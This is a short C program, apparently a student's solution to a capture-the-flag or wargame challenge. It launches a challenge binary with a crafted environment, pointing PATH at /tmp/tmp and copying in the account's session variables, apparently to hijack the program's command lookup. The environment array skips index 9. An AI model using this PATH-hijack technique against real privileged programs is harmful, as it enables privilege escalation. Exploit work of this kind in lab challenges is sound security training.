/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   solution.c                                         :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbougrin <mbougrin@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2015/03/12 18:46:31 by mbougrin          #+#    #+#             */
/*   Updated: 2015/03/12 18:49:41 by mbougrin         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdlib.h>
#include <stdio.h>

int main(int ac, char **av, char **env)
{
	env[0] = "PATH=/tmp/tmp";
	env[1] = "PWD=/challenge/binary/binary1";
	env[2] = "SHLVL=1";
	env[3] = "HOME=/challenge/binary/binary1";
	env[4] = "LOGNAME=binary1";
	env[5] = "SSH_CONNECTION=62.210.34.47 61247 192.168.166.151 22";
	env[6] = "LC_CTYPE=UTF-8";
	env[7] = "_=/usr/bin/env";
	env[8] = "OLDPWD=/tmp/tmp";
	env[10] = NULL;
	av[0] = "binary1";
	av[1] = NULL;
	execve("/challenge/binary/binary1/binary1", av, env);
	return 0;
}
